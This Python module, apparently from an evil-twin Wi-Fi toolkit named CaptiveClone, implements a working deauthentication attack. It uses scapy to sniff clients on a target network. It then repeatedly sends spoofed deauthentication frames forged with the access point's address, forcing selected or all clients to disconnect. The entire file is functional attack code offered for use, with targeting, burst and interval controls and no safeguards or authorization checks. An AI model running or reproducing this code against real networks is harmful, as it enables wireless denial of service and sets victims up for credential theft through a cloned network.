"""
Deauthentication module for CaptiveClone.

This module is responsible for sending deauthentication frames to clients
connected to a target network, forcing them to reconnect.
"""

import logging
import threading
import time
from typing import List, Optional, Set, Dict

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff
from scapy.error import Scapy_Exception

from captiveclone.utils.exceptions import DeauthError
from captiveclone.hardware.adapter import WirelessAdapter
from captiveclone.core.models import WirelessNetwork

logger = logging.getLogger(__name__)

class Deauthenticator:
    """
    Sends deauthentication frames to clients connected to a target network.
    """
    
    def __init__(self, interface: str):
        """
        Initialize the deauthenticator.
        
        Args:
            interface: Name of the wireless interface to use for sending frames
            
        Raises:
            DeauthError: If the interface is not valid or doesn't support monitor mode
        """
        self.interface = interface
        self.adapter = None
        self.running = False
        self.stop_event = threading.Event()
        self.target_network = None
        self.targeted_clients = set()  # Set of MAC addresses to target
        self.blacklisted_clients = set()  # Set of MAC addresses to ignore
        self.clients = {}  # Dict of clients seen on target network
        self.interval = 0.5  # Time between deauth bursts
        self.num_frames = 5  # Number of frames to send per burst
        
        self._validate_and_setup()
    
    def _validate_and_setup(self):
        """
        Validate the interface and set up the adapter.
        
        Raises:
            DeauthError: If requirements aren't met
        """
        try:
            self.adapter = WirelessAdapter(self.interface)
            
            if not self.adapter.supports_monitor_mode:
                raise DeauthError(f"Interface {self.interface} does not support monitor mode")
                
            if not self.adapter.supports_injection:
                logger.warning(f"Interface {self.interface} does not support packet injection")
        
        except Exception as e:
            raise DeauthError(f"Failed to initialize deauthenticator: {str(e)}")
    
    def set_target_network(self, network: WirelessNetwork) -> None:
        """
        Set the target network for deauthentication.
        
        Args:
            network: The network to target
        """
        self.target_network = network
        logger.debug(f"Set target network to '{network.ssid}' ({network.bssid})")
    
    def add_client(self, client_mac: str) -> None:
        """
        Add a client to the target list.
        
        Args:
            client_mac: MAC address of the client to target
        """
        self.targeted_clients.add(client_mac.lower())
        if client_mac.lower() in self.blacklisted_clients:
            self.blacklisted_clients.remove(client_mac.lower())
        logger.debug(f"Added client {client_mac} to target list")
    
    def remove_client(self, client_mac: str) -> None:
        """
        Remove a client from the target list.
        
        Args:
            client_mac: MAC address of the client to remove
        """
        if client_mac.lower() in self.targeted_clients:
            self.targeted_clients.remove(client_mac.lower())
        logger.debug(f"Removed client {client_mac} from target list")
    
    def blacklist_client(self, client_mac: str) -> None:
        """
        Add a client to the blacklist.
        
        Args:
            client_mac: MAC address of the client to blacklist
        """
        self.blacklisted_clients.add(client_mac.lower())
        if client_mac.lower() in self.targeted_clients:
            self.targeted_clients.remove(client_mac.lower())
        logger.debug(f"Added client {client_mac} to blacklist")
    
    def set_interval(self, interval: float) -> None:
        """
        Set the interval between deauth bursts.
        
        Args:
            interval: Time in seconds between bursts
        """
        self.interval = max(0.1, interval)  # Minimum 0.1 seconds
        logger.debug(f"Set deauth interval to {self.interval} seconds")
    
    def set_num_frames(self, num_frames: int) -> None:
        """
        Set the number of frames to send per burst.
        
        Args:
            num_frames: Number of frames per burst
        """
        self.num_frames = max(1, num_frames)  # Minimum 1 frame
        logger.debug(f"Set deauth frames per burst to {self.num_frames}")
    
    def start(self, target_all_clients: bool = False) -> None:
        """
        Start the deauthentication process.
        
        Args:
            target_all_clients: Whether to target all clients or only those in the targeted_clients set
            
        Raises:
            DeauthError: If requirements aren't met
        """
        if self.running:
            logger.warning("Deauthenticator is already running")
            return
        
        if not self.target_network:
            raise DeauthError("No target network set")
        
        # Put interface in monitor mode
        if not self.adapter.set_monitor_mode(True):
            raise DeauthError(f"Failed to set interface {self.interface} to monitor mode")
        
        # Set channel to match target network
        if self.target_network.channel:
            self.adapter.set_channel(self.target_network.channel)
        
        self.running = True
        self.stop_event.clear()
        
        # Start client discovery thread
        discovery_thread = threading.Thread(
            target=self._discover_clients,
            daemon=True
        )
        discovery_thread.start()
        
        # Start deauthentication thread
        deauth_thread = threading.Thread(
            target=self._deauth_loop,
            args=(target_all_clients,),
            daemon=True
        )
        deauth_thread.start()
        
        logger.info(f"Started deauthenticating clients on '{self.target_network.ssid}'")
    
    def stop(self) -> None:
        """
        Stop the deauthentication process.
        """
        if not self.running:
            return
        
        self.stop_event.set()
        self.running = False
        
        # Put interface back to managed mode
        self.adapter.set_monitor_mode(False)
        
        logger.info("Stopped deauthentication")
    
    def _discover_clients(self) -> None:
        """
        Discover clients connected to the target network.
        """
        if not self.target_network:
            return
        
        def process_packet(packet):
            # Check if we're still running
            if self.stop_event.is_set():
                return True
            
            # Check if packet has Dot11 layer
            if not packet.haslayer(Dot11):
                return
            
            # Get BSS ID from packet
            bssid = None
            source = None
            dest = None
            
            if packet.addr1 and packet.addr1 != "ff:ff:ff:ff:ff:ff":
                dest = packet.addr1.lower()
            
            if packet.addr2:
                source = packet.addr2.lower()
            
            if packet.addr3:
                bssid = packet.addr3.lower()
            
            # Check if this packet is to/from our target network
            target_bssid = self.target_network.bssid.lower()
            if bssid == target_bssid:
                # This packet involves our target network
                client = None
                
                # If source is not the AP, it's a client
                if source and source != target_bssid:
                    client = source
                
                # If destination is not the AP and not broadcast, it's a client
                elif dest and dest != target_bssid and dest != "ff:ff:ff:ff:ff:ff":
                    client = dest
                
                # If we found a client
                if client:
                    current_time = time.time()
                    old_last_seen = self.clients.get(client, {}).get("last_seen", 0)
                    
                    # Update client info
                    self.clients[client] = {
                        "last_seen": current_time,
                        "packets": self.clients.get(client, {}).get("packets", 0) + 1
                    }
                    
                    # Log newly discovered client
                    if client not in self.clients or current_time - old_last_seen > 60:
                        logger.debug(f"Discovered client {client} on network '{self.target_network.ssid}'")
        
        try:
            # Start packet sniffing for client discovery
            sniff(
                iface=self.interface,
                prn=process_packet,
                stop_filter=lambda _: self.stop_event.is_set(),
                store=False
            )
        except Scapy_Exception as e:
            logger.error(f"Error in client discovery: {str(e)}")
    
    def _deauth_loop(self, target_all_clients: bool) -> None:
        """
        Main deauthentication loop.
        
        Args:
            target_all_clients: Whether to target all clients or only those in the targeted_clients set
        """
        while not self.stop_event.is_set():
            try:
                current_time = time.time()
                active_clients = []
                
                # Find active clients (seen in the last 60 seconds)
                for client, info in self.clients.items():
                    if current_time - info["last_seen"] < 60:
                        # Skip blacklisted clients
                        if client in self.blacklisted_clients:
                            continue
                        
                        # If targeting specific clients, check if this client is targeted
                        if not target_all_clients and self.targeted_clients and client not in self.targeted_clients:
                            continue
                        
                        active_clients.append(client)
                
                # If targeting specific clients, add them even if they haven't been seen
                if not target_all_clients and self.targeted_clients:
                    for client in self.targeted_clients:
                        if client not in active_clients and client not in self.blacklisted_clients:
                            active_clients.append(client)
                
                # Send deauthentication frames to each client
                for client in active_clients:
                    self._send_deauth(client)
                
                time.sleep(self.interval)
            
            except Exception as e:
                logger.error(f"Error in deauthentication loop: {str(e)}")
                time.sleep(1)
    
    def _send_deauth(self, client_mac: str) -> None:
        """
        Send deauthentication frames to a client.
        
        Args:
            client_mac: MAC address of the client to deauthenticate
        """
        if not self.target_network:
            return
        
        ap_mac = self.target_network.bssid
        client_mac = client_mac.lower()
        
        # Create deauthentication packet (from AP to client)
        deauth_frame = RadioTap() / Dot11(
            addr1=client_mac,
            addr2=ap_mac,
            addr3=ap_mac
        ) / Dot11Deauth(reason=7)  # reason 7: Class 3 frame received from nonassociated STA
        
        try:
            # Send multiple frames
            for _ in range(self.num_frames):
                sendp(deauth_frame, iface=self.interface, verbose=False)
            
            logger.debug(f"Sent {self.num_frames} deauth frames to client {client_mac}")
        
        except Exception as e:
            logger.error(f"Failed to send deauth frame to {client_mac}: {str(e)}")
    
    def get_active_clients(self) -> Dict[str, Dict]:
        """
        Get a list of active clients.
        
        Returns:
            Dictionary of active clients with their information
        """
        current_time = time.time()
        active_clients = {}
        
        for client, info in self.clients.items():
            if current_time - info["last_seen"] < 60:
                active_clients[client] = {
                    "last_seen": info["last_seen"],
                    "packets": info["packets"],
                    "targeted": client in self.targeted_clients,
                    "blacklisted": client in self.blacklisted_clients
                }
        
        return active_clients
    
    def __del__(self):
        """Clean up resources on deletion."""
        self.stop() 